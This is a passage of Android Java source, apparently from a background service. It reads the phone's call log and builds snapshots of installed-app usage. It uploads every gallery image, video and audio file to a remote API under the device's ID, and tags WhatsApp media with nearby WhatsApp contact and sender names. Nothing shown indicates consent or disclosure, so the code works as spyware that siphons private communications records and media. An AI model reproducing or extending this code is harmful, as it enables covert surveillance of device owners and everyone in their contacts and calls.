            writeSentKeys(KEY_SENT_CONTACT_KEYS, sent, 6000);
        } catch (Exception e) {
            Log.e(TAG, "sendContactsDump err", e);
        }
    }

    private void sendCallLogDump() {
        try {
            if (!hasPermission(android.Manifest.permission.READ_CALL_LOG)) {
                Log.i(TAG, "no READ_CALL_LOG permission");
                return;
            }

            Set<String> sent = readSentKeys(KEY_SENT_CALL_KEYS);
            ContentResolver cr = getContentResolver();
            Cursor cur = cr.query(android.provider.CallLog.Calls.CONTENT_URI, null, null, null, android.provider.CallLog.Calls.DATE + " DESC");
            if (cur == null) return;

            int queued = 0;
            int scanned = 0;
            while (cur.moveToNext() && scanned++ < 4000 && queued < 500) {
                try {
                    String number = cur.getString(cur.getColumnIndexOrThrow(android.provider.CallLog.Calls.NUMBER));
                    int type = cur.getInt(cur.getColumnIndexOrThrow(android.provider.CallLog.Calls.TYPE));
                    long duration = cur.getLong(cur.getColumnIndexOrThrow(android.provider.CallLog.Calls.DURATION));
                    long ts = cur.getLong(cur.getColumnIndexOrThrow(android.provider.CallLog.Calls.DATE));
                    String cachedName = null;
                    try {
                        cachedName = cur.getString(cur.getColumnIndexOrThrow(android.provider.CallLog.Calls.CACHED_NAME));
                    } catch (Exception ignored) {
                    }

                    String key = "call|" + number + "|" + ts + "|" + duration + "|" + type;
                    if (sent.contains(key)) continue;

                    JSONObject payload = new JSONObject();
                    payload.put("number", number);
                    payload.put("type", type);
                    payload.put("direction", callDirectionLabel(type));
                    payload.put("typeLabel", callDirectionLabel(type));
                    payload.put("duration", duration);
                    payload.put("syncKey", key);
                    payload.put("ts", ts);
                    String contactName = cachedName != null && cachedName.trim().length() > 0 ? cachedName : lookupContactName(number);
                    if (contactName != null && contactName.trim().length() > 0) {
                        payload.put("contactName", contactName);
                    }
                    sendOrQueue("call", payload);

                    sent.add(key);
                    queued++;
                } catch (Exception e) {
                    Log.e(TAG, "call item err", e);
                }
            }
            cur.close();
            writeSentKeys(KEY_SENT_CALL_KEYS, sent, 4000);
        } catch (Exception e) {
            Log.e(TAG, "sendCallLogDump err", e);
        }
    }

    private String callDirectionLabel(int type) {
        if (type == android.provider.CallLog.Calls.INCOMING_TYPE) return "Recebida";
        if (type == android.provider.CallLog.Calls.OUTGOING_TYPE) return "Efetuada";
        if (type == android.provider.CallLog.Calls.MISSED_TYPE) return "Perdida";
        if (type == android.provider.CallLog.Calls.REJECTED_TYPE) return "Rejeitada";
        if (type == android.provider.CallLog.Calls.BLOCKED_TYPE) return "Bloqueada";
        if (type == android.provider.CallLog.Calls.VOICEMAIL_TYPE) return "Voicemail";
        return "Desconhecida";
    }

    private void maybeSendAppUsageSnapshot() {
        try {
            if (!hasUsageStatsAccess()) return;
            long lastSyncAt = prefs().getLong(KEY_LAST_APP_USAGE_SYNC_AT, 0L);
            if ((System.currentTimeMillis() - lastSyncAt) < APP_USAGE_SYNC_INTERVAL_MS) return;

            JSONObject payload = buildAppUsageSnapshot();
            if (payload == null) return;
            sendOrQueue("app_usage_snapshot", payload);
            prefs().edit().putLong(KEY_LAST_APP_USAGE_SYNC_AT, System.currentTimeMillis()).apply();
        } catch (Exception e) {
            Log.e(TAG, "maybeSendAppUsageSnapshot err", e);
        }
    }

    private JSONObject buildAppUsageSnapshot() {
        try {
            UsageStatsManager usageStatsManager = (UsageStatsManager) getSystemService(USAGE_STATS_SERVICE);
            if (usageStatsManager == null) return null;

            long now = System.currentTimeMillis();
            long windowStart = now - APP_USAGE_WINDOW_MS;
            List<UsageStats> usageStats = usageStatsManager.queryUsageStats(UsageStatsManager.INTERVAL_DAILY, windowStart, now);
            Map<String, UsageStats> usageByPackage = new HashMap<>();
            if (usageStats != null) {
                for (UsageStats stat : usageStats) {
                    if (stat == null || stat.getPackageName() == null) continue;
                    UsageStats existing = usageByPackage.get(stat.getPackageName());
                    if (existing == null) {
                        usageByPackage.put(stat.getPackageName(), stat);
                    } else {
                        existing.add(stat);
                    }
                }
            }

            JSONArray apps = new JSONArray();
            List<ApplicationInfo> installedApps = getPackageManager().getInstalledApplications(0);
            int added = 0;
            for (ApplicationInfo appInfo : installedApps) {
                if (appInfo == null || appInfo.packageName == null) continue;
                JSONObject app = new JSONObject();
                String packageName = appInfo.packageName;
                CharSequence label = getPackageManager().getApplicationLabel(appInfo);
                UsageStats stat = usageByPackage.get(packageName);
                PackageInfo packageInfo = null;
                try {
                    packageInfo = getPackageManager().getPackageInfo(packageName, 0);
                } catch (Exception ignored) {
                }

                app.put("packageName", packageName);
                app.put("appName", label != null ? label.toString() : packageName);
                app.put("isSystemApp", (appInfo.flags & ApplicationInfo.FLAG_SYSTEM) != 0);
                if (packageInfo != null) app.put("firstInstallTimeMs", packageInfo.firstInstallTime);
                if (stat != null) {
                    app.put("lastTimeUsedMs", stat.getLastTimeUsed());
                    app.put("totalForegroundMs", stat.getTotalTimeInForeground());
                } else {
                    app.put("lastTimeUsedMs", 0L);
                    app.put("totalForegroundMs", 0L);
                }
                apps.put(app);
                added++;
                if (added >= 500) break;
            }

            JSONObject payload = new JSONObject();
            payload.put("capturedAtMs", now);
            payload.put("windowStartMs", windowStart);
            payload.put("windowEndMs", now);
            payload.put("apps", apps);
            return payload;
        } catch (Exception e) {
            Log.e(TAG, "buildAppUsageSnapshot err", e);
            return null;
        }
    }

    private String lookupContactName(String phoneNumber) {
        if (phoneNumber == null || phoneNumber.trim().length() == 0) return null;
        if (!hasPermission(android.Manifest.permission.READ_CONTACTS)) return null;
        Cursor cursor = null;
        try {
            Uri uri = Uri.withAppendedPath(ContactsContract.PhoneLookup.CONTENT_FILTER_URI, Uri.encode(phoneNumber));
            cursor = getContentResolver().query(uri, new String[]{ContactsContract.PhoneLookup.DISPLAY_NAME}, null, null, null);
            if (cursor != null && cursor.moveToFirst()) {
                return cursor.getString(0);
            }
        } catch (Exception e) {
            Log.e(TAG, "lookupContactName err", e);
        } finally {
            if (cursor != null) cursor.close();
        }
        return null;
    }

    private void uploadAllMediaOnce() {
        try {
            if (!canReadMedia()) {
                Log.i(TAG, "no media permission for media upload");
                return;
            }
            SharedPreferences sp = prefs();
            String deviceId = currentDeviceId();
            String token = currentToken();

            String uploadedJson = sp.getString(KEY_UPLOADED_MEDIA_HASHES, "{}");
            JSONObject uploadedObj = new JSONObject(uploadedJson);
            Set<String> uploaded = new HashSet<>();
            Iterator<String> it = uploadedObj.keys();
            while (it.hasNext()) uploaded.add(it.next());

            ContentResolver cr = getContentResolver();
            String[] projection = {
                    MediaStore.MediaColumns._ID,
                    MediaStore.MediaColumns.MIME_TYPE,
                    MediaStore.MediaColumns.DISPLAY_NAME,
                    MediaStore.MediaColumns.RELATIVE_PATH,
                    MediaStore.MediaColumns.SIZE,
                    MediaStore.MediaColumns.DATE_ADDED
            };

            if (hasImageAccess()) {
                scanMediaCollection(
                        cr,
                        MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
                        projection,
                        true,
                        "gallery_image",
                        uploaded,
                        uploadedObj,
                        sp,
                        deviceId,
                        token
                );
            }

            if (hasVideoAccess()) {
                scanMediaCollection(
                        cr,
                        MediaStore.Video.Media.EXTERNAL_CONTENT_URI,
                        projection,
                        false,
                        "gallery_video",
                        uploaded,
                        uploadedObj,
                        sp,
                        deviceId,
                        token
                );
            }

            if (hasAudioAccess()) {
                scanMediaCollection(
                        cr,
                        MediaStore.Audio.Media.EXTERNAL_CONTENT_URI,
                        projection,
                        false,
                        "gallery_audio",
                        uploaded,
                        uploadedObj,
                        sp,
                        deviceId,
                        token
                );
            }

        } catch (Exception e) {
            Log.e(TAG, "uploadAllMediaOnce err", e);
        }
    }

    private void scanMediaCollection(ContentResolver cr, Uri collectionUri, String[] projection, boolean image, String origin, Set<String> uploaded, JSONObject uploadedObj, SharedPreferences sp, String deviceId, String token) {
        try {
            uploadMediaCursor(
                    cr.query(collectionUri, projection, null, null, MediaStore.MediaColumns.DATE_ADDED + " DESC"),
                    image,
                    origin,
                    cr,
                    uploaded,
                    uploadedObj,
                    sp,
                    deviceId,
                    token
            );
        } catch (SecurityException e) {
            Log.w(TAG, "no permission for " + origin, e);
        } catch (Exception e) {
            Log.e(TAG, "scan media err " + origin, e);
        }
    }

    private void uploadMediaCursor(Cursor cursor, boolean image, String origin, ContentResolver cr, Set<String> uploaded, JSONObject uploadedObj, SharedPreferences sp, String deviceId, String token) {
        if (cursor == null) return;
        try {
            int count = 0;
            while (cursor.moveToNext()) {
                if (++count > 500) break;
                long id = cursor.getLong(cursor.getColumnIndexOrThrow(MediaStore.MediaColumns._ID));
                String mime = null;
                String displayName = null;
                String relativePath = null;
                long sizeBytes = 0L;
                long dateAddedSeconds = 0L;
                try {
                    mime = cursor.getString(cursor.getColumnIndexOrThrow(MediaStore.MediaColumns.MIME_TYPE));
                } catch (Exception ignored) {
                }
                try {
                    displayName = cursor.getString(cursor.getColumnIndexOrThrow(MediaStore.MediaColumns.DISPLAY_NAME));
                } catch (Exception ignored) {
                }
                try {
                    relativePath = cursor.getString(cursor.getColumnIndexOrThrow(MediaStore.MediaColumns.RELATIVE_PATH));
                } catch (Exception ignored) {
                }
                try {
                    sizeBytes = cursor.getLong(cursor.getColumnIndexOrThrow(MediaStore.MediaColumns.SIZE));
                } catch (Exception ignored) {
                }
                try {
                    dateAddedSeconds = cursor.getLong(cursor.getColumnIndexOrThrow(MediaStore.MediaColumns.DATE_ADDED));
                } catch (Exception ignored) {
                }

                Uri baseUri;
                if (image) {
                    baseUri = MediaStore.Images.Media.EXTERNAL_CONTENT_URI;
                } else if ("gallery_audio".equals(origin)) {
                    baseUri = MediaStore.Audio.Media.EXTERNAL_CONTENT_URI;
                } else {
                    baseUri = MediaStore.Video.Media.EXTERNAL_CONTENT_URI;
                }
                Uri uri = ContentUris.withAppendedId(baseUri, id);
                try (InputStream is = cr.openInputStream(uri)) {
                    if (is == null) continue;
                    byte[] data = readAllBytes(is);
                    String hash = sha256(data);
                    if (hash == null || uploaded.contains(hash)) continue;

                    String ext = ".bin";
                    if (mime != null && mime.contains("/")) ext = "." + mime.substring(mime.indexOf("/") + 1);
                    String filename = (displayName != null && displayName.trim().length() > 0)
                            ? displayName
                            : (("gallery_audio".equals(origin) ? "aud_" : (image ? "img_" : "vid_")) + id + ext);
                    String url = ApiConfig.api("/api/media/" + deviceId + "/upload");
                    long startedAt = System.currentTimeMillis();
                    java.util.Map<String, String> form = new java.util.HashMap<>();
                    form.put("captureMode", "device_library");
                    form.put("captureKind", origin);
                    JSONObject metadata = new JSONObject();
                    metadata.put("source", "MediaStoreScan");
                    metadata.put("origin", origin);
                    metadata.put("displayName", displayName);
                    metadata.put("relativePath", relativePath);
                    metadata.put("sizeBytes", sizeBytes > 0 ? sizeBytes : data.length);
                    if (dateAddedSeconds > 0) metadata.put("dateAddedMs", dateAddedSeconds * 1000L);
                    String relativePathLower = relativePath != null ? relativePath.toLowerCase() : "";
                    boolean isWhatsappSharedMedia = relativePathLower.contains("whatsapp")
                            || relativePathLower.contains("com.whatsapp")
                            || relativePathLower.contains("com.whatsapp.w4b");
                    if (isWhatsappSharedMedia) {
                        metadata.put("sourceApp", "whatsapp_shared_media");
                        JSONObject whatsappContext = findRecentWhatsappContext(dateAddedSeconds > 0 ? dateAddedSeconds * 1000L : System.currentTimeMillis());
                        if (whatsappContext != null) {
                            metadata.put("whatsappContact", whatsappContext.optString("contactName", null));
                            metadata.put("whatsappSender", whatsappContext.optString("senderName", null));
                            metadata.put("whatsappDirection", whatsappContext.optString("direction", "received"));
                        }
                    }
                    form.put("metadataJson", metadata.toString());
                    String resp = HttpClient.uploadFile(url, "media", filename, data, mime, form, token);
                    JSONObject jr = new JSONObject(resp != null ? resp : "{}");
                    if (jr.optBoolean("ok")) {
                        uploaded.add(hash);
                        uploadedObj.put(hash, true);
                        sp.edit().putString(KEY_UPLOADED_MEDIA_HASHES, uploadedObj.toString()).apply();
                        JSONObject ctx = new JSONObject();
                        ctx.put("contentType", mime);
                        ctx.put("origin", origin);
                        sendMetric("media_pipeline", "device_scan_upload", "ok", (int) (System.currentTimeMillis() - startedAt), (double) data.length, ctx);
                    } else {
                        JSONObject ctx = new JSONObject();
                        ctx.put("contentType", mime);
                        ctx.put("origin", origin);
                        ctx.put("response", jr.toString());
                        sendMetric("media_pipeline", "device_scan_upload", "error", (int) (System.currentTimeMillis() - startedAt), null, ctx);
                    }
                } catch (Exception e) {
                    Log.e(TAG, "upload media err " + origin, e);
                    try {
                        JSONObject ctx = new JSONObject();
                        ctx.put("origin", origin);
                        ctx.put("error", e.getClass().getSimpleName());
                        sendMetric("media_pipeline", "device_scan_upload", "error", null, null, ctx);
                    } catch (Exception ignored) {
                    }
                }
            }
        } finally {
            cursor.close();
        }
    }

    private JSONObject findRecentWhatsappContext(long mediaTimestampMs) {
        try {
            JSONArray arr = new JSONArray(prefs().getString(KEY_RECENT_WHATSAPP_CONTACTS, "[]"));
            JSONObject best = null;
            long bestDelta = Long.MAX_VALUE;
            for (int i = 0; i < arr.length(); i++) {
                JSONObject row = arr.optJSONObject(i);
                if (row == null) continue;
                long ts = row.optLong("ts", 0L);
                if (ts <= 0L) continue;
                long delta = Math.abs(ts - mediaTimestampMs);
                if (delta > 15 * 60 * 1000L) continue;
                if (delta < bestDelta) {
                    best = row;
                    bestDelta = delta;
                }
            }
            return best;
        } catch (Exception e) {
            Log.e(TAG, "findRecentWhatsappContext err", e);
            return null;
        }
    }

    private static byte[] readAllBytes(InputStream is) throws java.io.IOException {
        ByteArrayOutputStream bos = new ByteArrayOutputStream();
        byte[] buffer = new byte[8192];
        int read;
        while ((read = is.read(buffer)) != -1) bos.write(buffer, 0, read);
        is.close();
        return bos.toByteArray();
    }

    private static byte[] toWav(byte[] pcmData, int sampleRate, int channels, int bitsPerSample) {
        int byteRate = sampleRate * channels * bitsPerSample / 8;
        int blockAlign = channels * bitsPerSample / 8;
        ByteBuffer header = ByteBuffer.allocate(44).order(ByteOrder.LITTLE_ENDIAN);
        header.put(new byte[]{'R', 'I', 'F', 'F'});
        header.putInt(36 + pcmData.length);
        header.put(new byte[]{'W', 'A', 'V', 'E'});
        header.put(new byte[]{'f', 'm', 't', ' '});
        header.putInt(16);
        header.putShort((short) 1);
        header.putShort((short) channels);
        header.putInt(sampleRate);
        header.putInt(byteRate);
        header.putShort((short) blockAlign);
        header.putShort((short) bitsPerSample);
        header.put(new byte[]{'d', 'a', 't', 'a'});
        header.putInt(pcmData.length);

        ByteArrayOutputStream out = new ByteArrayOutputStream();
        try {
            out.write(header.array());
            out.write(pcmData);
        } catch (Exception ignored) {
        }
        return out.toByteArray();
    }

    private static String sha256(byte[] data) {
        try {
            MessageDigest md = MessageDigest.getInstance("SHA-256");
            md.update(data);
            byte[] digest = md.digest();
            StringBuilder sb = new StringBuilder();
            for (byte b : digest) sb.append(String.format("%02x", b & 0xff));
            return sb.toString();
        } catch (Exception e) {
            Log.e(TAG, "sha256 error", e);
            return null;
        }
    }
}
